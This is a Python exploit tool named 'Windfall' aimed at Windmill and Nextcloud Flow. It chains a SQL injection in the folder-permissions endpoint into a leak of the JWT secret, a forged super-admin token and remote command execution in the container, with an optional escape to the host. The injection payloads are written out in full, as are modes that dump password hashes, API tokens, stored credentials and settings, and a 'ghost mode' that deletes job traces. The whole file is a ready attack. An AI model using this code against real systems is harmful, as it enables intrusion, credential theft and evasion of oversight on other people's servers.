#!/usr/bin/env python3
"""
Windfall - Unified Windmill SQLi → Privilege Escalation → RCE

CVE pending (Windmill), CVE pending (Nextcloud Flow)

Supports:
  - Windmill standalone
  - Nextcloud Flow via proxy (requires Nextcloud auth)
  - Nextcloud Flow direct exposure

Author: Chocapikk
Date: 2026-01-12
"""

import argparse
import time
import uuid
from dataclasses import dataclass
from enum import Enum

import requests
from windfall import log

from windfall import (
    API_VERSION, API_AUTH_LOGIN, API_WHOAMI,
    API_FOLDERS_CREATE, API_FOLDERS_ADDOWNER, API_FOLDERS_GET, API_FOLDERS_DELETE,
    DeploymentType, WindmillBase, forge_jwt_token, auto_cleanup,
    interactive_shell as shell_prompt,
)

BANNER = """
╔═══════════════════════════════════════════════════════════════╗
║                      W I N D F A L L                          ║
║       Unified Windmill SQLi → Privilege Escalation → RCE      ║
║       Operator → JWT Forge → Super Admin → RCE                ║
║                                                               ║
║                   CVE pending (Windmill)                   ║
║                CVE pending (Nextcloud Flow)                ║
║                                                               ║
║    Supports: Standalone, Flow (proxy), Flow (direct)          ║
║                       by Chocapikk                            ║
╚═══════════════════════════════════════════════════════════════╝
"""


class Target(Enum):
    CONTAINER = "container"
    HOST = "host"


@dataclass
class Credentials:
    """Holds leaked and forged credentials."""
    jwt_secret: str | None = None
    admin_email: str | None = None
    forged_token: str | None = None


class WindmillPrivesc(WindmillBase):
    """Unified Windmill SQLi to privilege escalation exploit."""
    
    def __init__(
        self,
        url: str,
        token: str | None = None,
        username: str | None = None,
        password: str | None = None,
        nc_user: str | None = None,
        nc_pass: str | None = None,
        timeout: int = 30
    ) -> None:
        super().__init__(url, nc_user, nc_pass, timeout)
        self.session.headers["Content-Type"] = "application/json"
        self.credentials = Credentials()
        
        # Authenticate if credentials provided, otherwise will be checked after deployment detection
        self.initial_token = self._authenticate(token, username, password)

    def _authenticate(
        self,
        token: str | None,
        username: str | None,
        password: str | None
    ) -> str | None:
        """Authenticate via token or credentials. Returns None if no credentials provided."""
        if token:
            # Don't set header here - _req handles auth based on deployment type
            return token
        
        if username and password:
            obtained_token = self._login(username, password)
            if obtained_token:
                return obtained_token
            raise ValueError("Login failed")
        
        return None  # No credentials provided, will be checked later

    def _login(self, username: str, password: str) -> str | None:
        """Login with credentials and return token."""
        progress = log.progress(f"Logging in as {username}")
        
        # Detect deployment first if not already done
        if not self.api_prefix:
            if not self._detect_deployment():
                return None
        
        login_path = f"{self.api_prefix}{API_AUTH_LOGIN}" if self.api_prefix else f"/api{API_AUTH_LOGIN}"
        
        # Add Nextcloud auth if using proxy
        request_kwargs = {"timeout": self.timeout, "verify": False}
        if self._is_nextcloud_proxy() and self.nc_auth:
            request_kwargs["auth"] = self.nc_auth
        
        response = self.session.post(
            f"{self.url}{login_path}",
            json={"email": username, "password": password},
            **request_kwargs
        )
        
        if not response or not response.ok:
            progress.failure(f"Failed: {response.status_code if response else 'No response'}")
            return None
        
        # Login endpoint returns token as plain text, not JSON
        token = response.text.strip()
        if not token:
            progress.failure("Empty token")
            return None
        
        progress.success(f"Token: {token[:20]}...")
        return token


    @property
    def version(self) -> str:
        """Get Windmill version."""
        if not self.api_prefix:
            if not self._detect_deployment():
                return "unknown"
        
        response = self._get(API_VERSION, auth=False)
        return response.text.strip() if response else "unknown"

    # ==================== SQLi ====================

    def inject(self, sql_expression: str, silent: bool = False) -> str | None:
        """
        JSONB path injection via folder permissions.
        
        Attack flow:
            1. Create folder → become owner
            2. Call addowner → SQLi via JSONB path
            3. Read extra_perms → exfiltrate data
            4. Cleanup folder
        """
        if not self._ensure_workspace():
            return None

        folder_name = f"sqli_{uuid.uuid4().hex[:8]}"
        
        # Create folder (we become owner automatically)
        if not silent:
            progress = log.progress("Creating injection folder")
        
        if not self._post(
            API_FOLDERS_CREATE.format(workspace=self.workspace),
            json={"name": folder_name}
        ):
            if not silent:
                progress.failure("Failed")
            return None
        
        if not silent:
            progress.success(folder_name)

        # Inject SQL via JSONB path
        payload = f"x\"}}', (SELECT to_jsonb({sql_expression})), true)--"
        response = self._post(
            API_FOLDERS_ADDOWNER.format(workspace=self.workspace, folder=folder_name),
            json={"owner": payload}
        )
        
        if not response or "SqlErr" in response.text:
            self._cleanup_folder(folder_name)
            return None

        # Extract result
        response = self._get(API_FOLDERS_GET.format(workspace=self.workspace, folder=folder_name))
        result = response.json().get("extra_perms", {}).get("x") if response else None

        self._cleanup_folder(folder_name)
        return result

    def _ensure_workspace(self) -> bool:
        """Ensure we have workspace access."""
        return self._get_or_create_workspace()

    def _cleanup_folder(self, folder_name: str) -> None:
        """Delete temporary folder."""
        self._post(API_FOLDERS_DELETE.format(workspace=self.workspace, folder=folder_name))

    # ==================== Dump Actions ====================

    def dump_secrets(self) -> list[dict]:
        """Dump all settings from global_settings table."""
        if not self._ensure_workspace():
            return []

        log.info("Dumping global_settings...")
        count = self.inject("(SELECT count(1) FROM global_settings)", silent=True)
        if not count:
            log.error("Failed to get count")
            return []

        count = int(count)
        log.info(f"Found {count} setting(s)")

        critical = ['jwt_secret', 'license_key', 'scim_token', 'hub_api_secret', 'powershell_repo_pat', 'oauths', 'smtp_settings']
        results = []

        for i in range(count):
            name = self.inject(f"(SELECT name FROM global_settings LIMIT 1 OFFSET {i})", silent=True)
            if not name:
                continue
            value = self.inject(f"(SELECT value FROM global_settings LIMIT 1 OFFSET {i})", silent=True)
            if not value:
                continue

            is_critical = name in critical
            results.append({'name': name, 'value': value, 'critical': is_critical})

            if is_critical:
                log.success(f"{name}: {value}")
            else:
                log.info(f"{name}: {value}")

        return results

    def dump_resources(self) -> list[dict]:
        """Dump all resources (credentials, API keys, DB connections)."""
        if not self._ensure_workspace():
            return []

        log.info("Dumping resources...")
        count = self.inject("(SELECT count(1) FROM resource)", silent=True)
        if not count:
            log.error("Failed to get count")
            return []

        count = int(count)
        log.info(f"Found {count} resource(s)")

        results = []

        for i in range(count):
            path = self.inject(f"(SELECT path FROM resource LIMIT 1 OFFSET {i})", silent=True)
            if not path:
                continue

            rtype = self.inject(f"(SELECT resource_type FROM resource LIMIT 1 OFFSET {i})", silent=True)
            ws = self.inject(f"(SELECT workspace_id FROM resource LIMIT 1 OFFSET {i})", silent=True)
            value = self.inject(f"(SELECT value::text FROM resource LIMIT 1 OFFSET {i})", silent=True)

            results.append({'path': path, 'type': rtype, 'workspace': ws, 'value': value})

            log.success(f"Resource: {path}")
            if ws:
                log.info(f"  Workspace: {ws}")
            if rtype:
                log.info(f"  Type: {rtype}")
            if value:
                log.info(f"  Value: {value}")

        return results

    def dump_users(self) -> list[dict]:
        """Dump all users with password hashes from password table."""
        if not self._ensure_workspace():
            return []

        log.info("Dumping users with password hashes...")
        count = self.inject("(SELECT count(1) FROM password)", silent=True)
        if not count:
            log.error("Failed to get count")
            return []

        count = int(count)
        log.info(f"Found {count} user(s)")

        results = []

        for i in range(count):
            email = self.inject(f"(SELECT email FROM password LIMIT 1 OFFSET {i})", silent=True)
            if not email:
                continue

            hash_val = self.inject(f"(SELECT password_hash FROM password LIMIT 1 OFFSET {i})", silent=True)
            admin = self.inject(f"(SELECT super_admin FROM password LIMIT 1 OFFSET {i})", silent=True)
            login_type = self.inject(f"(SELECT login_type FROM password LIMIT 1 OFFSET {i})", silent=True)

            results.append({'email': email, 'hash': hash_val, 'super_admin': admin, 'login_type': login_type})

            log.success(f"User: {email}")
            if hash_val:
                log.info(f"  Hash: {hash_val}")
            log.info(f"  Super Admin: {admin}")
            if login_type:
                log.info(f"  Login Type: {login_type}")

        return results

    def dump_tokens(self) -> list[dict]:
        """Dump all API tokens from token table."""
        if not self._ensure_workspace():
            return []

        log.info("Dumping tokens...")
        count = self.inject("(SELECT count(1) FROM token)", silent=True)
        if not count:
            log.error("Failed to get count")
            return []

        count = int(count)
        log.info(f"Found {count} token(s)")

        results = []

        for i in range(count):
            token = self.inject(f"(SELECT token FROM token LIMIT 1 OFFSET {i})", silent=True)
            if not token:
                continue

            email = self.inject(f"(SELECT email FROM token LIMIT 1 OFFSET {i})", silent=True)
            label = self.inject(f"(SELECT label FROM token LIMIT 1 OFFSET {i})", silent=True)

            results.append({'token': token, 'email': email, 'label': label})

            log.success(f"Token: {token}")
            if email:
                log.info(f"  Email: {email}")
            if label:
                log.info(f"  Label: {label}")

        return results

    def _leak_credentials(self) -> bool:
        """Leak JWT secret and admin email via SQLi (2 queries, reusing same folder)."""
        progress = log.progress("SQLi → Creating folder")
        folder = f"sqli_{uuid.uuid4().hex[:8]}"
        
        if not self._post(API_FOLDERS_CREATE.format(workspace=self.workspace), json={"name": folder}):
            progress.failure("Cannot create folder")
            return False
        progress.success(f"{folder} (we are owner)")

        # Query 1: Leak jwt_secret
        progress = log.progress("SQLi → Leaking jwt_secret")
        payload = "x\"}', (SELECT to_jsonb((SELECT value FROM global_settings WHERE name='jwt_secret'))), true)--"
        self._post(API_FOLDERS_ADDOWNER.format(workspace=self.workspace, folder=folder), json={"owner": payload})
        
        response = self._get(API_FOLDERS_GET.format(workspace=self.workspace, folder=folder))
        self.credentials.jwt_secret = response.json().get("extra_perms", {}).get("x") if response else None
        
        if not self.credentials.jwt_secret:
            self._cleanup_folder(folder)
            progress.failure("Failed")
            return False
        progress.success(f"{self.credentials.jwt_secret[:24]}...")

        # Query 2: Leak admin email - try super_admin first, then any admin
        progress = log.progress("SQLi → Leaking admin email")
        
        # Try super_admin first
        payload = "y\"}', (SELECT to_jsonb((SELECT email FROM password WHERE super_admin LIMIT 1))), true)--"
        self._post(API_FOLDERS_ADDOWNER.format(workspace=self.workspace, folder=folder), json={"owner": payload})
        
        response = self._get(API_FOLDERS_GET.format(workspace=self.workspace, folder=folder))
        admin_email = response.json().get("extra_perms", {}).get("y") if response else None
        
        # If no super_admin found, try any user from password table
        if not admin_email:
            payload = "z\"}', (SELECT to_jsonb((SELECT email FROM password LIMIT 1))), true)--"
            self._post(API_FOLDERS_ADDOWNER.format(workspace=self.workspace, folder=folder), json={"owner": payload})
            response = self._get(API_FOLDERS_GET.format(workspace=self.workspace, folder=folder))
            admin_email = response.json().get("extra_perms", {}).get("z") if response else None
        
        self._cleanup_folder(folder)
        
        if admin_email:
            self.credentials.admin_email = admin_email
            progress.success(self.credentials.admin_email)
            return True
        else:
            progress.failure("Could not leak admin email (required for JWT forge)")
            return False

    # ==================== JWT Forge ====================

    def forge_admin_token(self) -> bool:
        """Forge admin JWT token using shared utility."""
        if not self.credentials.jwt_secret:
            return False

        self.credentials.forged_token = forge_jwt_token(
            self.credentials.jwt_secret,
            self.credentials.admin_email,
            self.workspace
        )
        return True

    def escalate_privileges(self) -> bool:
        """Switch to forged admin token."""
        if not self.credentials.forged_token:
            return False
        
        # Create new session to avoid cookie/token conflicts
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers["Content-Type"] = "application/json"
        
        # Set token - _req handles auth based on deployment type (header vs cookie)
        self.initial_token = self.credentials.forged_token
        response = self._get(API_WHOAMI)
        return response is not None and response.json().get("super_admin", False)

    # ==================== RCE ====================

    def execute(self, command: str, target: Target = Target.CONTAINER) -> str | None:
        """Execute command on container or host (uses common rce from WindmillBase)."""
        return self.rce(command, host=(target == Target.HOST))

    # ==================== Exploit Chain ====================

    def whoami(self) -> dict | None:
        """Get current user info."""
        response = self._get(API_WHOAMI)
        return response.json() if response else None

    def run(self, escape_to_host: bool = False) -> bool:
        """Execute full exploit chain: SQLi → JWT Forge → Privesc → RCE."""
        
        # Detect deployment first
        if not self.api_prefix:
            if not self._detect_deployment():
                return False
        
        # Check initial access
        progress = log.progress("Initial access")
        user = self.whoami()
        
        if not user:
            progress.failure("Invalid token")
            return False
        
        if user.get("super_admin"):
            progress.success(f"{user['email']} (already admin)")
            return True
        
        progress.success(f"{user['email']} (operator)")

        # Get workspace (uses _get_or_create_workspace from base class)
        if not self._ensure_workspace():
            return False

        # SQLi phase - single query leaks both jwt_secret and admin email
        if not self._leak_credentials():
            return False

        # Privilege escalation phase
        progress = log.progress("Forging admin JWT")
        if not self.forge_admin_token():
            progress.failure("Failed")
            return False
        progress.success(f"{self.credentials.forged_token[:50]}...")

        progress = log.progress("Escalating privileges")
        if not self.escalate_privileges():
            progress.failure("Failed")
            return False
        
        whoami_data = self.whoami()
        is_super = whoami_data.get("super_admin", False) if whoami_data else False
        progress.success(f"→ super_admin={is_super}")

        # RCE test
        progress = log.progress("Container RCE")
        rce_result = self.execute("id") or ""
        if "uid=" not in rce_result:
            progress.failure("Failed")
            return False
        progress.success(rce_result.split()[0])
        log.success("PRIVESC COMPLETE: Operator → Super Admin → RCE")

        if escape_to_host:
            progress = log.progress("Docker escape")
            host_result = self.execute("id", Target.HOST) or ""
            if "uid=" not in host_result:
                progress.failure("Failed")
                return False
            progress.success(f"→ {(self.execute('hostname', Target.HOST) or 'host').strip()}")

        return True


# ==================== CLI ====================

class CLI:
    """Command-line interface handler."""
    
    def __init__(self, exploit: WindmillPrivesc, args: argparse.Namespace) -> None:
        self.exploit = exploit
        self.args = args

    def run_command(self, command: str, target: Target) -> None:
        """Execute single command."""
        progress = log.progress(f"RCE ({'HOST' if target == Target.HOST else 'container'})")
        
        if output := self.exploit.execute(command, target):
            progress.success("OK")
            print(f"\n{output}")
        else:
            progress.failure("Failed")

    def interactive_shell(self, target: Target) -> None:
        """Start interactive shell."""
        if target == Target.HOST:
            hostname = (self.exploit.execute("hostname", Target.HOST) or "host").strip()
            is_host = True
        else:
            hostname = "windmill"
            is_host = False
        
        shell_prompt(lambda cmd: self.exploit.execute(cmd, target), hostname=hostname, is_host=is_host)

    def run(self) -> None:
        """Main CLI execution."""
        log.info(f"Target: {self.exploit.url}")
        log.info(f"Version: {self.exploit.version}")

        # SQLi query only mode
        if self.args.query:
            progress = log.progress("SQLi query")

            if not self.exploit._ensure_workspace():
                progress.failure("No workspace")
                return

            if result := self.exploit.inject(self.args.query):
                progress.success("OK")
                print(f"\n{result}")
            else:
                progress.failure("Failed")
            return

        # Dump actions (no RCE needed, just SQLi)
        if self.args.dump_all or self.args.dump_secrets or self.args.dump_resources or self.args.dump_users or self.args.dump_tokens:
            if self.args.dump_all or self.args.dump_secrets:
                print("\n" + "=" * 50)
                print("GLOBAL SETTINGS")
                print("=" * 50)
                self.exploit.dump_secrets()

            if self.args.dump_all or self.args.dump_resources:
                print("\n" + "=" * 50)
                print("RESOURCES")
                print("=" * 50)
                self.exploit.dump_resources()

            if self.args.dump_all or self.args.dump_users:
                print("\n" + "=" * 50)
                print("USERS")
                print("=" * 50)
                self.exploit.dump_users()

            if self.args.dump_all or self.args.dump_tokens:
                print("\n" + "=" * 50)
                print("TOKENS")
                print("=" * 50)
                self.exploit.dump_tokens()
            return

        # Full exploit chain - wrap everything to clean ALL jobs (including RCE tests)
        needs_host = self.args.host or self.args.host_cmd

        with auto_cleanup(self.exploit, getattr(self.args, 'clean', False)):
            if not self.exploit.run(escape_to_host=needs_host):
                return

            if self.args.cmd:
                self.run_command(self.args.cmd, Target.CONTAINER)
            elif self.args.host_cmd:
                self.run_command(self.args.host_cmd, Target.HOST)
            else:
                self.interactive_shell(Target.HOST if self.args.host else Target.CONTAINER)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Unified Windmill SQLi → Privilege Escalation → RCE",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Windmill standalone
  %(prog)s http://windmill:8000 -t TOKEN
  %(prog)s http://windmill:8000 -u user@windmill.dev -p pass
  
  # Nextcloud Flow via proxy (REQUIRES Nextcloud credentials for SQLi)
  %(prog)s https://nextcloud -u admin -p secret --nc-user admin --nc-pass secret
  %(prog)s https://nextcloud -t TOKEN --nc-user admin --nc-pass secret
  
  # Flow direct
  %(prog)s http://flow:8000 -t TOKEN
  %(prog)s http://flow:8000 -u user@windmill.dev -p pass
  
  # Commands
  %(prog)s http://target:8000 -t TOKEN -c "id"
  %(prog)s http://target:8000 -t TOKEN -H
  %(prog)s http://target:8000 -t TOKEN -q "version()"
"""
    )
    parser.add_argument("url", help="Target URL")
    
    auth_group = parser.add_argument_group("authentication (choose one)")
    auth_group.add_argument("-t", "--token", metavar="TOKEN", help="Windmill API token")
    auth_group.add_argument("-u", "--user", metavar="EMAIL", help="Windmill username/email")
    auth_group.add_argument("-p", "--password", metavar="PASS", help="Windmill password")
    
    nc_group = parser.add_argument_group("Nextcloud credentials (REQUIRED for SQLi via Flow proxy)")
    nc_group.add_argument("--nc-user", metavar="USER", required=False, help="Nextcloud username (REQUIRED for SQLi via proxy)")
    nc_group.add_argument("--nc-pass", metavar="PASS", required=False, help="Nextcloud password (REQUIRED for SQLi via proxy)")
    
    parser.add_argument("-c", "--cmd", metavar="CMD", help="Container command")
    parser.add_argument("-H", "--host", action="store_true", help="Host shell")
    parser.add_argument("--host-cmd", metavar="CMD", help="Host command")
    parser.add_argument("-q", "--query", metavar="SQL", help="SQLi query only")
    parser.add_argument("--clean", action="store_true", help="Ghost mode: DELETE all job traces from DB")

    # Dump actions (like MSF auxiliary/gather/windmill_sqli)
    dump_group = parser.add_argument_group("dump actions")
    dump_group.add_argument("--dump-secrets", action="store_true", help="Dump global_settings (jwt_secret, license_key, etc.)")
    dump_group.add_argument("--dump-resources", action="store_true", help="Dump resources (credentials, API keys, DB connections)")
    dump_group.add_argument("--dump-users", action="store_true", help="Dump users with password hashes")
    dump_group.add_argument("--dump-tokens", action="store_true", help="Dump API tokens")
    dump_group.add_argument("--dump-all", action="store_true", help="Dump everything (secrets, resources, users, tokens)")

    return parser.parse_args()


def main() -> None:
    print(BANNER)
    args = parse_args()
    
    try:
        exploit = WindmillPrivesc(
            args.url,
            token=args.token,
            username=args.user,
            password=args.password,
            nc_user=args.nc_user,
            nc_pass=args.nc_pass
        )
    except ValueError as e:
        log.failure(str(e))
        return

    # Detect deployment type first
    if not exploit.api_prefix:
        try:
            if not exploit._detect_deployment():
                log.error("❌ Failed to detect deployment type")
                log.error("   Please ensure the target is accessible and credentials are correct")
                return
        except Exception as e:
            log.error("❌ Failed to detect deployment type")
            log.error(f"   Connection error: {type(e).__name__}")
            log.error("   Please ensure the target is accessible and credentials are correct")
            return
    
    # Check credentials requirements based on deployment type
    has_windmill_creds = bool(args.token or (args.user and args.password))
    
    if not has_windmill_creds:
        deployment_name = {
            DeploymentType.STANDALONE: "Standalone",
            DeploymentType.FLOW_DIRECT: "Flow Direct",
            DeploymentType.FLOW_PROXY: "Flow Proxy"
        }.get(exploit.deployment_type, "this deployment")
        log.error(f"❌ Windmill credentials are REQUIRED for {deployment_name}")
        log.error("   Please provide Windmill authentication (--token or --user/--password)")
        log.error("   Example: --token TOKEN or --user admin@windmill.dev --password pass")
        return
    
    if exploit.deployment_type == DeploymentType.FLOW_PROXY:
        if not args.nc_user or not args.nc_pass:
            log.error("❌ Nextcloud credentials (--nc-user/--nc-pass) are REQUIRED for SQLi via Flow proxy")
            log.error("   Endpoints like /api/auth/login and /api/w/*/folders/* are blocked without Nextcloud auth")
            log.error("   Note: Path traversal (windfall_afr.py) works unauth, but SQLi requires Nextcloud creds")
            log.error("   Example: --nc-user admin --nc-pass password")
            return

    CLI(exploit, args).run()


if __name__ == "__main__":
    main()
